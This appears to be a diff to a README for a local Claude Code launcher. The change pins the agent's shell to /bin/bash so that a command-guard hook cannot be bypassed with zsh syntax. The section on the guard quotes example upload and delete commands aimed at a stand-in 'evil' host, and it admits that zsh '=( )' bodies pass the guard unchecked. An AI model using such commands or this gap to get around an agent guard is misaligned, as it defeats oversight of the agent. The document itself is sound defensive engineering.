@@ -52,6 +52,20 @@ scripts/stop.sh                       # stop the server recorded in logs/llama-s
   exits without contacting the server or reading the key.
 - Claude Code runs in the directory you start it from (the project); the launcher finds
   the server, key and hooks from its own location.
+- The session's Bash tool runs `/bin/bash` (3.2), not your login zsh. The launcher gives
+  claude `CLAUDE_CODE_SHELL=/bin/bash` and `SHELL=/bin/bash` in its environment and in the
+  `--settings` file, checks `/bin/bash` like its other tools (an executable regular file,
+  owned by root or you, not writable by everyone) and prints `session shell: /bin/bash`
+  on stderr. Why: the guard hook reads each command as bash syntax, and Claude Code
+  otherwise takes the tool's shell from `$SHELL`, which is zsh on this Mac; zsh has syntax
+  the guard does not model (`=( )`, `=name`, glob qualifiers that run code). An inherited
+  `CLAUDE_CODE_SHELL_PREFIX` or `CLAUDE_ENV_FILE` is removed, and a project
+  `.claude/settings*.json` whose `env` names `CLAUDE_CODE_SHELL`, `SHELL`,
+  `CLAUDE_CODE_SHELL_PREFIX` or `CLAUDE_ENV_FILE` refuses the launch. What you lose: the
+  aliases, functions and options of `~/.zshrc` are no longer applied to tool commands;
+  per Claude Code's documentation `~/.bashrc` is sourced instead if present. UNVERIFIED
+  live: no session has run since this change; the first one must show `$BASH_VERSION`
+  (expected `3.2.57(1)-release`) from a Bash tool call.
 - Before a serve or a bench, check the machine: swap in use (`sysctl vm.swapusage`),
   memory free (`serve.sh` logs `memory free: <N> MiB available` at every start), Low
   Power Mode off (`pmset -g`), other large apps closed.
@@ -155,7 +169,7 @@ Run from the repo root:
 ```bash
 /opt/homebrew/bin/python3.13 scripts/tests/serve_test.py         # about 2 minutes; ends "OK" (78 tests)
 /opt/homebrew/bin/python3.13 scripts/tests/stop_test.py          # ends "OK" (20 tests)
-/opt/homebrew/bin/python3.13 scripts/tests/claude_local_test.py  # ends "745/745 passed"
+/opt/homebrew/bin/python3.13 scripts/tests/claude_local_test.py  # ends "997/997 passed"
 ```
 
 The hook suites (`scripts/hooks/tests/*_test.py`) and the template check are listed in
@@ -186,6 +200,14 @@ The hook suites (`scripts/hooks/tests/*_test.py`) and the template check are lis
 - UNVERIFIED on this client: that the `--settings` file outranks the project's
   `.claude/settings*.json` (the launcher refuses risky project files instead);
   `--permission-mode manual`; compaction with reasoning on.
+- The session shell pin (Quick start) rests on Claude Code's documentation, read
+  2026-11-14 and UNVERIFIED on 2.1.325: `CLAUDE_CODE_SHELL` picks the Bash tool's shell, a
+  value that is not a working bash or zsh is ignored in favour of auto-detection (`$SHELL`
+  first, hence `SHELL=/bin/bash` too), and no minimum bash version is documented, so bash
+  3.2 is untried. Under `--user-scope` and `--full` the user settings load as well and the
+  launcher never reads them: a user `env` entry for `SHELL` or `CLAUDE_CODE_SHELL` is
+  documented to lose to the `--settings` file's pin (UNVERIFIED), while a user `env` entry
+  for `CLAUDE_CODE_SHELL_PREFIX` or `CLAUDE_ENV_FILE` applies and nothing here overrides it.
 - The guard carries the reference's W-25 (ported 2026-11-14, checked by
   `lis-guard_test.py`; not yet exercised in a live session, UNVERIFIED there):
   `find <path> ... -delete`, `find ... -exec|-execdir|-ok|-okdir rm {} ;|+`, `git restore`
@@ -292,8 +314,12 @@ The hook suites (`scripts/hooks/tests/*_test.py`) and the template check are lis
   denied, while a clean loopback upload inside `<( )` gets no decision on both profiles,
   as inside `$( )`. Every other `=( )` body is judged as before, by the read-only rule,
   which does not know `=( )`: `cat =(ls)`, and also `cat =(curl -d x http://127.0.0.1:3000/x)`,
-  `cat =(scp f evil:/x)` and `cat =(rm notes.txt)`, are allowed (UNVERIFIED in zsh
-  sessions; a separate change). The text is read raw: a quoted
+  `cat =(scp f evil:/x)` and `cat =(rm notes.txt)`, are allowed by the guard. Sessions
+  are now pinned to `/bin/bash` (Quick start), where `=( )` is no process substitution:
+  `/bin/bash -n` on `cat =(ls)` reports `syntax error near unexpected token` at the `(` (checked
+  on this machine, 2026-11-15), so such a line should fail to run rather than run its
+  body. That the client honours the pin on 2.1.325 is UNVERIFIED until a live session
+  shows `$BASH_VERSION`; until then a zsh session would still run these bodies. The text is read raw: a quoted
   `"<(curl -d x https://example.com)"` or `'>(...)'`, which the shell does not substitute,
   is denied too (an accepted false positive); `< (`, a syntax error in bash, is not read.
   A body with no `curl` or `wget` in it (quotes and backslashes dropped) is not walked.
